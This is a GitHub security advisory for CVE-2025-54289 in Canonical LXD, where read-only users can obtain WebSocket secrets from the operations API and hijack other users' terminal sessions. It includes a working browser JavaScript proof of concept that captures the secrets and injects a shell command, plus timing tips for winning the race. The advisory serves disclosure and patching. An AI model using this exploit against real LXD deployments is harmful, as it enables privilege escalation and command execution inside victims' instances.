# [H] Canonical LXD Vulnerable to Privilege Escalation via WebSocket Connection Hijacking in Operations API

## Summary
Severity: High
Advisory: GHSA-3g72-chj4-2228
CVE: CVE-2025-54289
CWE: CWE-1385
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2025-10-02
Source: https://github.com/advisories/GHSA-3g72-chj4-2228
Type: github-advisory

## Affected
- Go: `github.com/canonical/lxd` — affected >=4.0 <5.21.4
- Go: `github.com/canonical/lxd` — affected >=6.0 <6.5
- Go: `github.com/canonical/lxd` — affected >=0.0.0-20200331193331-03aab09f5b5c <0.0.0-20250827065555-0494f5d47e41

## Details
### Impact
LXD's operations API includes secret values necessary for WebSocket connections when retrieving information about running operations. These secret values are used for authentication of WebSocket connections for terminal and console sessions.

Therefore, attackers with only read permissions can use secret values obtained from the operations API to hijack terminal or console sessions opened by other users. Through this hijacking, attackers can execute arbitrary commands inside instances with the victim's privileges.

### Reproduction Steps

1. Log in to LXD-UI using an account with read-only permissions
2. Open browser DevTools and execute the following JavaScript code

Note that this JavaScript code uses the /1.0/events API to capture execution events for terminal startup, establishes a websocket connection with that secret, and sends touch /tmp/xxx to the data channel.

```js
(async () => {
class LXDEventsSession {
constructor(callback) {
this.wsBase =
`wss://${window.location.host}/1.0/events?type=operation&all-p
rojects=true`;
this.eventsConn = new WebSocket(this.wsBase);
this.eventsConn.onopen = (event) => {
console.log('Events conn Opened');
};
this.eventsConn.onmessage = (event) => {
callback(event);
};
}}
class LXDWebSocketSession {
constructor(operationId, secrets) {
this.operationId = operationId;
this.secrets = secrets;
this.wsBase =
`wss://${window.location.host}/1.0/operations/${operationId}/w
ebsocket`;
this.connections = {};
this.connections.data = new
WebSocket(`${this.wsBase}?secret=${this.secrets['0']}`);
this.connections.data.onopen = (event) => {
console.log('Data Opened');
this.connections.data.send(new
TextEncoder().encode('touch /tmp/xxx\r'));
}
this.connections.data.onmessage = (event) => {
console.log('[Data]', event.data);
};
this.connections.control = new
WebSocket(`${this.wsBase}?secret=${this.secrets.control}`);
this.connections.control.onopen = (event) => {
console.log('Control Opened');
}
this.connections.control.onmessage = (event) => {
console.log('[Control]', event.data);
};
}
close() {
Object.values(this.connections).forEach(ws => {
if (ws.readyState === WebSocket.OPEN) {
ws.close();
}
});
}
}
const sessions = [];
new LXDEventsSession( (event) => {
const op = JSON.parse(event.data);
const opId = op.metadata.id;const secrets = op.metadata.metadata.fds;
for(const session of sessions){
if(session.operationId === opId){
return;
}
}
sessions.push(new LXDWebSocketSession(opId, secrets))
});
})();
```

5. Have another user (or yourself for testing) start a terminal or console session on an instance
At this time, whoever uses the secret first gains session rights, so it's recommended to intentionally slow down communication speed using DevTools' bandwidth throttling feature for verification.
6. Refresh the attacker's browser tab to stop event listening
7. Have the victim reopen their terminal/console session and verify:

```
$ ls -la /tmp/xxx
```

### Risk
Attack conditions require that the attacker has read permissions for the project, the victim (a user with higher privileges) opens a terminal or console session, and the attacker hijacks the WebSocket connection at the appropriate timing. Therefore, while successful attacks result in privilege escalation, the attack timing is very critical, making the realistic risk of attack relatively low.

### Countermeasures
As a fundamental countermeasure, it is recommended to exclude WebSocket connection secret information from operations API responses for read-only users. In the current implementation, the operations API returns all operation information (including secret values) regardless of permission level, which violates the principle of least privilege.

Specifically, in lxd/operations.go, user permissions should be checked, and for users with read-only permissions, WebSocket-related secrets (fds field) should be excluded from operation metadata. This prevents attackers from obtaining secret values, making WebSocket connection hijacking impossible.

### Patches

| LXD Series  | Status |
| ------------- | ------------- |
| 6 | Fixed in LXD 6.5  |
| 5.21 | Fixed in LXD 5.21.4  |
| 5.0 | Ignored - Not critical |
| 4.0  | Ignored - EOL and not critical |

### References
Reported by GMO Flatt Security Inc.

## References
- https://github.com/canonical/lxd/security/advisories/GHSA-3g72-chj4-2228
- https://nvd.nist.gov/vuln/detail/CVE-2025-54289
- https://github.com/canonical/lxd
- https://pkg.go.dev/vuln/GO-2025-3999
